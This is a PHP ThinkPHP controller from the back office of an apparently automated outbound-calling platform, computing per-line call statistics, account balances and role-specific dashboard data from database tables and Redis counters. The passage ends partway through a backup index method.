<?php
namespace app\user\controller;
use think\Db;
use think\Cache;
use app\common\controller\User;
use app\common\controller\AdminData;
use app\common\controller\MemberData;
use app\common\controller\LinesData;
use app\common\controller\DevicesData;
use app\common\controller\RedisConnect;
class Index extends User{
public function ceshi(){
$user_auth = session('user_auth');
print_r($user_auth);
}
public  function get_line_info(){
ini_set('memory_limit','2048M');
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$time = input('post.time','','trim,strip_tags');
$where['o.owner']=$uid;
$startTime = strtotime(date('Y-m-d'));
$endTime = strtotime(date('Y-m-d',strtotime('+1 day')));
$where['o.create_time']=[['>=',$startTime],['<',$endTime],'and'];
$where['tl.status']=1;
$tel_orders = Db::name('tel_order')->
alias('o')->
join('tel_line tl','o.call_phone_id	 = tl.id')->
field('o.id,o.call_phone_id,sum(o.call_money) money')->group('call_phone_id')->where($where)->select();
foreach($tel_orders as $k=>$v){
if(empty($v['call_phone_id'])){
unset($tel_orders[$k]);
}
}
$tel_orders=array_values($tel_orders);
foreach($tel_orders as $k=>$v){
$tel_ordersss= Db::name('tel_order')->where(['owner'=>$uid,'call_phone_id'=>$v['call_phone_id'],'create_time'=>[['>=',$startTime],['<',$endTime],'and']])->select();
foreach($tel_ordersss as $key=>$value){
if(empty($value['duration'])){
unset($tel_ordersss[$key]);
}
}
$tel_ordersss=array_values($tel_ordersss);
$timeduration=0;
foreach($tel_ordersss as $key=>$value){
$timeduration +=  ceil($value['duration']/60);
}
$tel_orders[$k]['duration']=$timeduration;
$tel_orders[$k]['money'] = sprintf("%.3f",$v['money']);
}
foreach($tel_orders as $k=>$v){
$tel_orders[$k]['phone_name']=getPhoneName($v['call_phone_id']);
$whereTime['create_time']=[['>=',$startTime],['<',$endTime],'and'];
$callNum = get_phone_count($v['call_phone_id'],$whereTime);
$yingdaNum  =  get_yingda_count($v['call_phone_id'],$whereTime);
$jietongNum =get_jietong_count($v['call_phone_id'],$whereTime);
$tel_orders[$k]['callNumCount']=$callNum;
$tel_orders[$k]['yingdaNum']=$yingdaNum;
$tel_orders[$k]['jietongNum']=$jietongNum;
if(!empty($callNum)){
$tel_orders[$k]['yingda']= sprintf("%.3f",$yingdaNum/$callNum*100);
}else{
$tel_orders[$k]['yingda']=sprintf("%.3f",0);
}
if(!empty($callNum)){
$tel_orders[$k]['jietong']=sprintf("%.3f",$jietongNum/$callNum*100);
}else{
$tel_orders[$k]['jietong']=sprintf("%.3f",0);
}
}
$count = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->count('*');
if(empty($tel_orders)){
$tel_orders=[];
$lines = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($lines as $k=>$v){
$tel_orders[$k]['phone_name']=getPhoneName($v['id']);
$tel_orders[$k]['yingda']=sprintf("%.3f",0);
$tel_orders[$k]['jietong']=sprintf("%.3f",0);
$tel_orders[$k]['duration']=0;
$tel_orders[$k]['money']=sprintf("%.3f",0);
$tel_orders[$k]['call_phone_id'] = $v['id'];
$tel_orders[$k]['callNumCount']=0;
$tel_orders[$k]['yingdaNum']=0;
$tel_orders[$k]['jietongNum']=0;
}
}elseif(count($tel_orders) <$count){
foreach($tel_orders as $k=>$v){
$arr[$k]=$v['call_phone_id'];
}
$lines = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($lines as $k=>$v){
$brr[$k]=$v['id'];
}
$crr = array_values(array_diff($brr,$arr));
$count_order = count($tel_orders);
foreach($crr as $k=>$v){
$tel_orders[$count_order+$k]['phone_name']=getPhoneName($v);
$tel_orders[$count_order+$k]['yingda']=0;
$tel_orders[$count_order+$k]['jietong']=0;
$tel_orders[$count_order+$k]['duration']=0;
$tel_orders[$count_order+$k]['money']=sprintf("%.3f",0);
$tel_orders[$count_order+$k]['call_phone_id'] = $v;
$tel_orders[$count_order+$k]['callNumCount']=0;
$tel_orders[$count_order+$k]['yingdaNum']=0;
$tel_orders[$count_order+$k]['jietongNum']=0;
}
}
if($time==1){
return returnAjax(0,'数据获取成功',$tel_orders);
}elseif($time==7){
$wherex['tls.member_id']=$uid;
$startTime = date('Y-m-d',strtotime('-6 days'));
$endTime =date('Y-m-d',time());
$wherex['tls.date']=[['>=',$startTime],['<',$endTime],'and'];
$wherex['tl.status']=1;
$lines = Db::name('tel_line_statistics')->
alias('tls')->
join('tel_line tl','tls.line_id	 = tl.id')->
field('tls.line_id,sum(tls.connect_count) connect_count,sum(tls.call_count) call_count,sum(tls.number_count) number_count,sum(tls.charging_duration) duration,sum(tls.money) money')->group('tls.line_id')->where($wherex)->select();
foreach($lines as $k=>$v){
if(empty($v['line_id'])){
unset($lines[$k]);
}
}
$lines=array_values($lines);
foreach($lines as $k=>$v){
$lines[$k]['phone_name']=getPhoneName($v['line_id']);
$lines[$k]['money']=sprintf("%.3f",$v['money']);
if(!empty($v['number_count'])){
$lines[$k]['yingda']= round($v['connect_count']/$v['number_count']*100,2);
}else{
$lines[$k]['yingda']=0;
}
if(!empty($v['number_count'])){
$lines[$k]['jietong']= round($v['call_count']/$v['number_count']*100,2);
}else{
$lines[$k]['jietong']=0;
}
$lines[$k]['number_count']=$v['number_count'];
$lines[$k]['connect_count_num']=$v['connect_count'];
$lines[$k]['call_count_num']=$v['call_count'];
$lines[$k]['call_phone_id']=$v['line_id'];
}
$count = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->count('*');
if(empty($lines)){
$lines=[];
$lines_tel = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($lines_tel as $k=>$v){
$lines[$k]['phone_name']=getPhoneName($v['id']);
$lines[$k]['yingda']=0;
$lines[$k]['jietong']=0;
$lines[$k]['duration']=0;
$lines[$k]['money']=sprintf("%.3f",0);
$lines[$k]['call_phone_id'] = $v['id'];
$lines[$k]['number_count'] = 0;
$lines[$k]['connect_count_num']=0;
$lines[$k]['call_count_num']=0;
}
}elseif( count($lines) <$count ){
foreach($lines as $k=>$v){
$arr[$k]=$v['line_id'];
}
$linexxxxs = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($linexxxxs as $k=>$v){
$brr[$k]=$v['id'];
}
$crr = array_values(array_diff($brr,$arr));
$count_order = count($lines);
foreach($crr as $k=>$v){
$lines[$count_order+$k]['phone_name']=getPhoneName($v);
$lines[$count_order+$k]['yingda']=0;
$lines[$count_order+$k]['jietong']=0;
$lines[$count_order+$k]['duration']=0;
$lines[$count_order+$k]['money']=sprintf("%.3f",0);
$lines[$count_order+$k]['call_phone_id'] = $v;
$lines[$count_order+$k]['number_count'] = 0;
$lines[$count_order+$k]['connect_count_num']=0;
$lines[$count_order+$k]['call_count_num']=0;
}
}
foreach($lines as $k=>$v){
foreach($tel_orders as $key=>$value){
if($v['call_phone_id']==$value['call_phone_id']){
$lines[$k]['money']=sprintf("%.3f",$lines[$k]['money']+$value['money']);
$lines[$k]['duration']=$lines[$k]['duration']+$value['duration'];
if( ($v['number_count']+$value['callNumCount'])>0 ){
$lines[$k]['jietong']=sprintf("%.3f",($v['connect_count_num']+$value['yingdaNum'])/($v['number_count']+$value['callNumCount'])*100);
}else{
$lines[$k]['jietong']=sprintf("%.3f",0);
}
if(($v['number_count']+$value['callNumCount'])>0){
$lines[$k]['yingda']=sprintf("%.3f",($v['call_count_num']+$value['jietongNum'])/($v['number_count']+$value['callNumCount'])*100);
}else{
$lines[$k]['yingda']=sprintf("%.3f",0);
}
}
}
}
return returnAjax(0,'数据获取成功',$lines);
}elseif($time==30){
$wherex['tls.member_id']=$uid;
$startTime = date('Y-m-d',strtotime('-29 days'));
$endTime =date('Y-m-d',time());
$wherex['tls.date']=[['>=',$startTime],['<',$endTime],'and'];
$wherex['tl.status']=1;
$lines = Db::name('tel_line_statistics')->
alias('tls')->
join('tel_line tl','tls.line_id	 = tl.id')->
field('tls.line_id,sum(tls.connect_count) connect_count,sum(tls.call_count) call_count,sum(tls.number_count) number_count,sum(tls.charging_duration) duration,sum(tls.money) money')->group('tls.line_id')->where($wherex)->select();
foreach($lines as $k=>$v){
if(empty($v['line_id'])){
unset($lines[$k]);
}
}
$lines = array_values($lines);
foreach($lines as $k=>$v){
$lines[$k]['phone_name']=getPhoneName($v['line_id']);
$lines[$k]['money']=sprintf("%.3f",$v['money']);
if(!empty($v['number_count'])){
$lines[$k]['yingda']= round($v['connect_count']/$v['number_count']*100,2);
}else{
$lines[$k]['yingda']=0;
}
if(!empty($v['number_count'])){
$lines[$k]['jietong']= round($v['call_count']/$v['number_count']*100,2);
}else{
$lines[$k]['jietong']=0;
}
$lines[$k]['number_count']=$v['number_count'];
$lines[$k]['connect_count_num']=$v['connect_count'];
$lines[$k]['call_count_num']=$v['call_count'];
$lines[$k]['call_phone_id']=$v['line_id'];
}
$count = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->count('*');
if(empty($lines)){
$lines=[];
$lines_tel = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($lines_tel as $k=>$v){
$lines[$k]['phone_name']=getPhoneName($v['id']);
$lines[$k]['yingda']=0;
$lines[$k]['jietong']=0;
$lines[$k]['duration']=0;
$lines[$k]['money']=sprintf("%.3f",0);
$lines[$k]['call_phone_id'] = $v['id'];
$lines[$k]['number_count'] = 0;
$lines[$k]['connect_count_num']=0;
$lines[$k]['call_count_num']=0;
}
}elseif( count($lines)<$count ){
foreach($lines as $k=>$v){
$arr[$k]=$v['line_id'];
}
$linexxxxs = Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->select();
foreach($linexxxxs as $k=>$v){
$brr[$k]=$v['id'];
}
$crr = array_values(array_diff($brr,$arr));
$count_order = count($lines);
foreach($crr as $k=>$v){
$lines[$count_order+$k]['phone_name']=getPhoneName($v);
$lines[$count_order+$k]['yingda']=0;
$lines[$count_order+$k]['jietong']=0;
$lines[$count_order+$k]['duration']=0;
$lines[$count_order+$k]['money']=sprintf("%.3f",0);
$lines[$count_order+$k]['call_phone_id'] = $v;
$lines[$count_order+$k]['number_count'] = 0;
$lines[$count_order+$k]['connect_count_num']=0;
$lines[$count_order+$k]['call_count_num']=0;
}
}
foreach($lines as $k=>$v){
foreach($tel_orders as $key=>$value){
if($v['call_phone_id']==$value['call_phone_id']){
$lines[$k]['money']=sprintf("%.3f",$lines[$k]['money']+$value['money']);
$lines[$k]['duration']=$lines[$k]['duration']+$value['duration'];
if( ($v['number_count']+$value['callNumCount'])>0 ){
$lines[$k]['jietong']=sprintf("%.3f",($v['connect_count_num']+$value['yingdaNum'])/($v['number_count']+$value['callNumCount'])*100);
}else{
$lines[$k]['jietong']=sprintf("%.3f",0);
}
if( ($v['number_count']+$value['callNumCount'])>0 ){
$lines[$k]['yingda']=sprintf("%.3f",($v['call_count_num']+$value['jietongNum'])/($v['number_count']+$value['callNumCount'])*100);
}else{
$lines[$k]['yingda']=sprintf("%.3f",0);
}
}
}
}
return returnAjax(0,'数据获取成功',$lines);
}
}
public function get_new_line_info_by_redis(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$time = input('post.time','','trim,strip_tags');
$now_time = strtotime(date("Y-m-d"));
$lines = [];
$where['user_id'] = $uid;
$where['status'] = 1;
$line_list = Db::name('tel_line_group')->where($where)->field('id,name')->select();
if($line_list){
$redis = RedisConnect::get_redis_connect();
foreach ($line_list as $key =>$val) {
$incr_key_line_connect_count = "incr_owner_".$uid."_".$val['id']."_".$now_time."_line_connect_count";
$incr_key_line_unconnect_count = "incr_owner_".$uid."_".$val['id']."_".$now_time."_line_unconnect_count";
$conect_count = $redis->get($incr_key_line_connect_count);
$unconnect_count = $redis->get($incr_key_line_unconnect_count);
$line_charging_duration = $line_money = 0;
$incr_key_line_charging_duration = "incr_owner_".$uid."_".$val['id']."_".$now_time."_line_charging_duration";
$incr_key_line_money = "incr_owner_".$uid."_".$val['id']."_".$now_time."_line_money";
$line_charging_duration = $redis->get($incr_key_line_charging_duration) ??0;
$line_money = $redis->get($incr_key_line_money) ??0;
if(($conect_count+$unconnect_count) >0){
$yingda = sprintf("%.3f",$conect_count/($conect_count+$unconnect_count)*100);
}else{
$yingda = sprintf("%.3f",0);
}
if($line_money){
$line_money = sprintf("%.3f",$line_money);
}else{
$line_money = sprintf("%.3f",0);
}
if(!$line_charging_duration){
$line_charging_duration = 0;
}
$lines[] = [
'id'=>$val['id'],
'phone_name'=>$val['name'],
'yingda'=>$yingda,
'duration'=>$line_charging_duration,
'money'=>$line_money,
];
}
}
return returnAjax(0,'数据获取成功',$lines);
}
public function get_new_line_info(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$line_ids = $line_list = $new_tel_orders = $_tel_orders = $order_liens = [];
$where['member_id'] = $uid;
$where['status'] = 1;
$line_list = Db::name('tel_line')->where($where)->field('id,name')->select();
if($line_list){
foreach ($line_list as $key =>$val) {
$line_ids[] = $val['id'];
}
if($line_ids){
$wheres['owner']=$uid;
$startTime = strtotime(date('Y-m-d'));
$endTime = strtotime(date('Y-m-d',strtotime('+1 day')));
$wheres['call_phone_id'] = ['in',$line_ids];
$wheres['create_time']=[['>=',$startTime],['<',$endTime],'and'];
$tel_orders = Db::name('tel_order')->force('index_owner_line_asr_sms_create_time_mobile')
->field('id,call_phone_id,sum(call_money) money,sum(ceil(duration/60)) as duration,count(id) as counts')
->group('call_phone_id')
->where($wheres)
->select();
if($tel_orders) {
foreach ($tel_orders as $key =>$val) {
$_tel_orders[$val['call_phone_id']] = $val;
$order_liens[] = $val['call_phone_id'];
}
}
foreach($line_list as $k =>$v){
$whereTime['create_time']=[['>=',$startTime],['<',$endTime],'and'];
if(in_array($v['id'],$order_liens)){
$callNum = $_tel_orders[$v['id']]['counts'];
$yin['call_phone_id'] = $v['id'];
$yin['duration'] = ['>',0];
$yingdaNum = Db::name('tel_order')->where($yin)->count(1);
}else{
$callNum = 0;
$yingdaNum = 0;
}
$new_tel_orders[$k]['phone_name']= $v['name'];
if(!empty($_tel_orders[$v['id']]['money'])){
$new_tel_orders[$k]['money'] = sprintf("%.3f",$_tel_orders[$v['id']]['money']);
}else{
$new_tel_orders[$k]['money']  = sprintf("%.3f",0);
}
$new_tel_orders[$k]['duration']= $_tel_orders[$v['id']]['duration'] ??0;
$new_tel_orders[$k]['call_phone_id'] = $v['id'];
if(!empty($callNum)){
$new_tel_orders[$k]['yingda']= sprintf("%.3f",$yingdaNum/$callNum*100);
}else{
$new_tel_orders[$k]['yingda']= sprintf("%.3f",0);
}
}
}
}
return returnAjax(0,'数据获取成功',$new_tel_orders);
}
public  function get_every_data(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$adminNum = Db::name('admin')->where(['pid'=>$uid])->count('*');
$robotNum = Db::name('admin')->where(['pid'=>$uid])->sum('robot_cnt');
if(empty($robotNum)){
$robotNum = 0;
}
$user_data = Db::name('admin')->field('robot_cnt,usable_robot_cnt,last_month_balance')->where(['id'=>$uid])->find();
$myRobotNum = $user_data['robot_cnt'];
if(empty($myRobotNum)){
$myRobotNum=0;
}
$robotSurplusCount = $user_data['usable_robot_cnt'];
if(empty($robotSurplusCount)){
$robotSurplusCount=0;
}
$robotRunCount =Db::name('tel_config')->where(['status'=>1,'member_id'=>$uid])->sum('robot_cnt');
if(empty($robotRunCount)){
$robotRunCount=0;
}
$taskRunCount = Db::name('tel_config')->where(['status'=>1,'member_id'=>$uid])->count('*');
if(empty($taskRunCount)){
$taskRunCount=0;
}
if(!empty($robotSurplusCount) &&$robotSurplusCount!=0){
$robotUsageRate = round($robotRunCount/$robotSurplusCount*100,2);
}else{
$robotUsageRate =0;
}
$myMoneyBalance =  Db::name('admin')->where(['id'=>$uid])->value('money');
if(empty($myMoneyBalance)){
$myMoneyBalance=0;
}
$myMoneyBalance = sprintf("%.2f",$myMoneyBalance);
$startTime = strtotime(date('Y-m',time()));
$endTime = strtotime(date('Y-m',strtotime("+1 month")));
$wheress['owner']=$uid;
$wheress['create_time']=[['>=',$startTime],['<',$endTime],'and'];
$wheress['status']=1;
$monthRechargeMoney = Db::name('tel_deposit')->where($wheress)->sum('menoy');
if(empty($monthRechargeMoney)){
$monthRechargeMoney=0;
}
$monthRechargeMoney = sprintf("%.2f",$monthRechargeMoney);
$now_time = strtotime(date('Ymd',time()));
$redis = RedisConnect::get_redis_connect();
$incr_key_money = "incr_owner_".$uid."_".$now_time."_money";
$todayMoney = $redis->get($incr_key_money);
if(!$todayMoney ||$todayMoney <0){$todayMoney = 0;}
$whereyys['member_id']=$uid;
$whereyys['type'] = 'day';
$whereyys['date']=[['>=',$startTime],['<',$endTime],'and'];
$monthConsumptionMoney = Db::name('consumption_statistics')->where($whereyys)->sum('total_cost');
$monthConsumptionMoney = $monthConsumptionMoney +$todayMoney;
if(empty($monthConsumptionMoney)){
$monthConsumptionMoney=0;
}
$monthConsumptionMoney = sprintf("%.2f",$monthConsumptionMoney);
$agentCount = Db::name('admin')->where(['pid'=>$uid,'role_id'=>17])->count('*');
$businessCount = Db::name('admin')->where(['pid'=>$uid,'role_id'=>18])->count('*');
$salesCount = Db::name('admin')->where(['pid'=>$uid,'role_id'=>19,'status'=>['in',[0,1]]])->count('*');
$lineCount =Db::name('tel_line')->where(['member_id'=>$uid,'status'=>1])->count('*');
$pendingScenarios = Db::name('tel_scenarios')->where(['auditing'=>2,'member_id'=>$uid])->count('*');
$lineNum =Db::name('tel_line')->where(['pid'=>0,'member_id'=>$uid,'status'=>1])->count('*');
$ASRNum=Db::name('tel_interface')->where(['pid'=>0,'owner'=>$uid])->count('*');
$smsNum =Db::name('sms_channel')->where(['pid'=>0,'owner'=>$uid])->count('*');
$data['uid'] = $uid;
$data['adminNum']=$adminNum;
$data['robotNum']=$robotNum;
$data['last_month_balance'] = $user_data['last_month_balance'];
$data['robotTotalNum'] = $myRobotNum;
$data['lineNum']=$lineNum;
$data['ASRNum']=$ASRNum;
$data['smsNum']=$smsNum;
$data['robotSurplusCount']=$robotSurplusCount;
$data['robotRunCount']=$robotRunCount;
$data['taskRunCount']=$taskRunCount;
$data['robotUsageRate']=$robotUsageRate;
$data['myMoneyBalance']=$myMoneyBalance;
$data['monthRechargeMoney']=$monthRechargeMoney;
$data['monthConsumptionMoney']=$monthConsumptionMoney;
$data['agentCount']=$agentCount;
$data['businessCount']=$businessCount;
$data['salesCount']=$salesCount;
$data['lineCount']=$lineCount;
$data['pendingScenarios']=$pendingScenarios;
return returnAjax(0,'获取数据成功',$data);
}
public function get_son_admin($adminid,&$array=[]){
$where['pid']=['in',$adminid];
$admins = Db::name('admin')->where($where)->select();
if(!empty($admins)){
foreach($admins as $k=>$v){
$arr[$k]=$v['id'];
$array[]=$v['id'];
}
$this->get_son_admin($arr,$array);
}
return $array;
}
public function runTime($name = 'default',$unset_timer = TRUE)
{
static $timers = array();
if ( isset( $timers[$name ] ) )
{
list($s_sec,$s_mic) = explode(' ',$timers[$name ]);
list($e_sec,$e_mic) = explode(' ',microtime());
if ( $unset_timer )
unset( $timers[$name ] );
return $e_sec -$s_sec +( $e_mic -$s_mic );
}
$timers[$name ] = microtime();
}
public function index(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$AdminData = new AdminData();
$role_name = $AdminData->get_role_name($uid);
$now_time = strtotime(date("Y-m-d"));
if(isset($_COOKIE["is_eject_".$uid])){
$is_eject = $_COOKIE["is_eject_".$uid];
}else{
setcookie("is_eject_".$uid,0 ,0,'/');
$is_eject = isset($_COOKIE["is_eject_".$uid])?1 : 0;
}
$this->assign('is_eject',$is_eject);
setcookie("is_eject_".$uid,1 ,time() +86400,'/');
$show_days = get_show_day();
$this->assign('show_days',$show_days);
$redis = RedisConnect::get_redis_connect();
if($role_name == '管理员'){
$user_data = [];
}elseif($role_name == '运营商'||$role_name == '代理商'){
$super = $user_auth["super"];
$user_data = $this->get_user_data($uid);
$user_data['month_recharge_money'] = $AdminData->get_month_recharge_money($uid);
if(empty($user_data['month_recharge_money'])){
$user_data['month_recharge_money'] = 0;
}
$user_data['month_consumption_money'] = $AdminData->get_month_consumption_money($uid);
if(empty($user_data['month_consumption_money'])){
$user_data['month_consumption_money'] = 0;
}
$user_data['find_distribution_robot_count'] = $AdminData->get_find_distribution_robot_count($uid);
if(empty($user_data['find_distribution_robot_count'])){
$user_data['find_distribution_robot_count'] = 0;
}
$incr_key_all_count = "incr_owner_".$uid."_".$now_time."_all_count";
$all_count = $redis->get($incr_key_all_count);
if(!$all_count ||$all_count <0){
$all_count = 0;
$redis->set($incr_key_all_count,0);
}
$user_data['number_numbers'] = $all_count;
$connected_numbers_redis_key = "incr_owner_".$uid."_".$now_time."_connected_numbers";
$connected_numbers = $redis->get($connected_numbers_redis_key);
if(!$connected_numbers ||$connected_numbers <0){
$connected_numbers = 0;
$redis->set($connected_numbers_redis_key,0);
}
$user_data['connected_numbers']  = $connected_numbers;
$incr_key_all_unconnect_count = "incr_owner_".$uid."_".$now_time."_all_unconnect_count";
$unconnected_numbers = $redis->get($incr_key_all_unconnect_count);
if(!$unconnected_numbers ||$unconnected_numbers <0){
$unconnected_numbers = 0;
$redis->set($incr_key_all_unconnect_count,0);
}
$user_data['calls_numbers'] = $connected_numbers+$unconnected_numbers;
$user_data['run_customer_count'] = $user_data['number_numbers'] -$user_data['calls_numbers'];
if($user_data['run_customer_count'] <0){
$user_data['run_customer_count'] = 0;
}
if(empty($user_data['connected_numbers'])){
$user_data['connection_rate'] = 0;
}else{
$user_data['connection_rate'] = round($user_data['connected_numbers']/$user_data['calls_numbers']*100,2);
}
$intentional_customers_redis_key = "incr_owner_".$uid."_".$now_time."_intentional_customers";
$intentional_customers = $redis->get($intentional_customers_redis_key);
if(!$intentional_customers ||$intentional_customers <0){
$intentional_customers = 0;
$redis->set($intentional_customers_redis_key,0);
}
$user_data['intentional_customers']  = $intentional_customers;
}elseif($role_name == '商家'){
$user_data = $this->get_user_data($uid);
$user_data['month_recharge_money'] = $AdminData->get_month_recharge_money($uid);
if(empty($user_data['month_recharge_money'])){
$user_data['month_recharge_money'] = 0;
}
$user_data['month_consumption_money'] = $AdminData->get_month_consumption_money($uid);
if(empty($user_data['month_consumption_money'])){
$user_data['month_consumption_money'] = 0;
}
$user_data['find_distribution_robot_count'] = $AdminData->get_find_distribution_robot_count($uid);
if(empty($user_data['find_distribution_robot_count'])){
$user_data['find_distribution_robot_count'] = 0;
}
$incr_key_all_count = "incr_owner_".$uid."_".$now_time."_all_count";
$all_count = $redis->get($incr_key_all_count);
if(!$all_count ||$all_count <0){
$all_count = 0;
$redis->set($incr_key_all_count,0);
}
$user_data['number_numbers'] = $all_count;
$connected_numbers_redis_key = "incr_owner_".$uid."_".$now_time."_connected_numbers";
$connected_numbers = $redis->get($connected_numbers_redis_key);
if(!$connected_numbers ||$connected_numbers <0){
$connected_numbers = 0;
$redis->set($connected_numbers_redis_key,0);
}
$user_data['connected_numbers']  = $connected_numbers;
$incr_key_all_unconnect_count = "incr_owner_".$uid."_".$now_time."_all_unconnect_count";
$unconnected_numbers = $redis->get($incr_key_all_unconnect_count);
if(!$unconnected_numbers ||$unconnected_numbers <0){
$unconnected_numbers = 0;
$redis->set($incr_key_all_unconnect_count,0);
}
$user_data['calls_numbers'] = $connected_numbers+$unconnected_numbers;
$user_data['run_customer_count'] = $user_data['number_numbers'] -$user_data['calls_numbers'];
if($user_data['run_customer_count'] <0){
$user_data['run_customer_count'] = 0;
}
if(empty($user_data['connected_numbers'])){
$user_data['connection_rate'] = 0;
}else{
$user_data['connection_rate'] = round($user_data['connected_numbers']/$user_data['calls_numbers']*100,2);
}
$intentional_customers_redis_key = "incr_owner_".$uid."_".$now_time."_intentional_customers";
$intentional_customers = $redis->get($intentional_customers_redis_key);
if(!$intentional_customers ||$intentional_customers <0){
$intentional_customers = 0;
}
$user_data['intentional_customers']  = $intentional_customers;
}else{
$user_data = $this->get_user_data($uid);
$user_data['run_robot_count'] = $AdminData->get_run_robot_count($uid);
if(empty($user_data['run_robot_count'])){
$user_data['run_robot_count'] = 0;
}
$incr_key_all_count = "incr_owner_".$uid."_".$now_time."_all_count";
$all_count = $redis->get($incr_key_all_count);
if(!$all_count ||$all_count <0){
$all_count = 0;
}
$user_data['number_numbers'] = $all_count;
$connected_numbers_redis_key = "incr_owner_".$uid."_".$now_time."_connected_numbers";
$connected_numbers = $redis->get($connected_numbers_redis_key);
if(!$connected_numbers ||$connected_numbers <0){
$connected_numbers = 0;
$redis->set($connected_numbers_redis_key,0);
}
$user_data['connected_numbers']  = $connected_numbers;
$incr_key_all_unconnect_count = "incr_owner_".$uid."_".$now_time."_all_unconnect_count";
$unconnected_numbers = $redis->get($incr_key_all_unconnect_count);
if(!$unconnected_numbers ||$unconnected_numbers <0){
$unconnected_numbers = 0;
$redis->set($incr_key_all_unconnect_count,0);
}
$user_data['calls_numbers'] = $connected_numbers+$unconnected_numbers;
$user_data['run_customer_count'] = $user_data['number_numbers'] -$user_data['calls_numbers'];
if($user_data['run_customer_count'] <0){
$user_data['run_customer_count'] = 0;
}
if(empty($user_data['connected_numbers'])){
$user_data['connection_rate'] = 0;
}else{
$user_data['connection_rate'] = round($user_data['connected_numbers']/$user_data['calls_numbers']*100,2);
}
$intentional_customers_redis_key = "incr_owner_".$uid."_".$now_time."_intentional_customers";
$intentional_customers = $redis->get($intentional_customers_redis_key);
if(!$intentional_customers ||$intentional_customers <0){
$intentional_customers = 0;
}
$user_data['intentional_customers']  = $intentional_customers;
}
$this->setMeta('后台首页');
$this->assign('user_data',$user_data);
$this->assign('skb_token',cookie('skb_token'));
switch($role_name){
case '管理员':
return $this->fetch('administrator');
break;
case '运营商':
return $this->fetch('agent');
break;
case '代理商':
return $this->fetch('agent');
break;
case '商家':
return $this->fetch('customer_index');
break;
default:
$this->assign('user_data',$user_data);
$this->assign('user_auth',$user_auth);
return $this->fetch('indexV_new');
break;
}
}
public function index_bak(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$AdminData = new AdminData();
$role_name = $AdminData->get_role_name($uid);
$cache_name = 'index-cache-'.$uid;
$index_cache= Db::name('tel_userinfo_day_cache')->where('user_id',$uid)->order('time','desc')->find();
if(isset($_COOKIE["is_eject_".$uid])){
$is_eject = $_COOKIE["is_eject_".$uid];
}else{
setcookie("is_eject_".$uid,0 ,0,'/');
$is_eject = isset($_COOKIE["is_eject_".$uid])?1 : 0;
}
$this->assign('is_eject',$is_eject);
setcookie("is_eject_".$uid,1 ,time() +86400,'/');
if ($index_cache) {
$user_data = unserialize( $index_cache['user_data'] );
$user_data = array_merge($user_data,$this->get_user_data($uid));
}else {
$super = $user_auth["super"];
$user_data = $this->get_user_data($uid);
$user_data['run_robot_count'] = $AdminData->get_run_robot_count($uid);
if(empty($user_data['run_robot_count'])){
$user_data['run_robot_count'] = 0;
}
$user_data['run_customer_count'] = $AdminData->get_wait_call_phone_count($uid);
if(empty($user_data['run_customer_count'])){
$user_data['run_customer_count'] = 0;
}
$user_data['run_task_count'] = $AdminData->get_run_task_count($uid);
if(empty($user_data['run_task_count'])){
$user_data['run_task_count'] = 0;
}
if(empty($user_data['run_robot_count']) ||empty($user_data['robot_cnt'])){
$user_data['robot_usage_rate'] = 0;
}else{
$user_data['robot_usage_rate'] = round($user_data['run_robot_count'] / $user_data['robot_cnt'] * 100,2);
}
if(empty($user_data['robot_usage_rate'])){
$user_data['robot_usage_rate'] = 0;
}
$user_data['month_recharge_money'] = $AdminData->get_month_recharge_money($uid);
if(empty($user_data['month_recharge_money'])){
$user_data['month_recharge_money'] = 0;
}
$user_data['month_consumption_money'] = $AdminData->get_month_consumption_money($uid);
if(empty($user_data['month_consumption_money'])){
$user_data['month_consumption_money'] = 0;
}
$user_data['find_distribution_robot_count'] = $AdminData->get_find_distribution_robot_count($uid);
if(empty($user_data['find_distribution_robot_count'])){
$user_data['find_distribution_robot_count'] = 0;
}
$user_data['find_member_now_use_robot_count'] = $AdminData->get_find_member_now_use_robot_count($uid);
$user_data['find_member_robot_total_count'] = $AdminData->get_find_member_robot_total_count($uid);
$user_data['find_member_free_robot_count'] = $user_data['find_member_robot_total_count'] -$user_data['find_member_now_use_robot_count'];
if(empty($user_data['find_member_now_use_robot_count']) ||empty($user_data['find_member_robot_total_count'])){
$user_data['find_member_now_use_rate'] = 0;
}else{
$user_data['find_member_now_use_rate'] = round($user_data['find_member_now_use_robot_count']/$user_data['find_member_robot_total_count']*100,2);
}
if(empty($user_data['find_member_robot_total_count']) ||empty($user_data['robot_cnt'])){
$user_data['member_and_find_member_rate'] = 0;
}else{
$user_data['member_and_find_member_rate'] = round($user_data['find_member_robot_total_count']/$user_data['robot_cnt']*100,2);
}
$user_data['number_numbers'] = $AdminData->get_number_numbers($uid);$this->runTime('2');
$user_data['calls_numbers'] = $AdminData->get_calls_numbers($uid);
$user_data['connected_numbers'] = $AdminData->get_connected_numbers($uid);
if(empty($user_data['number_numbers']) ||empty($user_data['connected_numbers'])){
$user_data['connection_rate'] = 0;
}else{
$user_data['connection_rate'] = round($user_data['connected_numbers']/$user_data['calls_numbers']*100,2);
}
$user_data['intentional_customers'] = $AdminData->get_intentional_customers($uid);
$LinesData = new LinesData();
$user_data['line_count'] = $LinesData->get_line_count($uid);
$DevicesData = new DevicesData();
$user_data['seat_count'] = $DevicesData->get_count($uid);
$user_data['sale_count'] = $AdminData->get_sale_count($uid);
}
$this->setMeta('后台首页');
$this->assign('user_data',$user_data);
switch($role_name){
case '管理员':
return $this->fetch('administrator');
break;
case '运营商':
return $this->fetch('agent');
break;
case '代理商':
return $this->fetch('agent');
break;
case '商家':
return $this->fetch('customer_index');
break;
default:
$this->assign('user_data',$user_data);
$this->assign('user_auth',$user_auth);
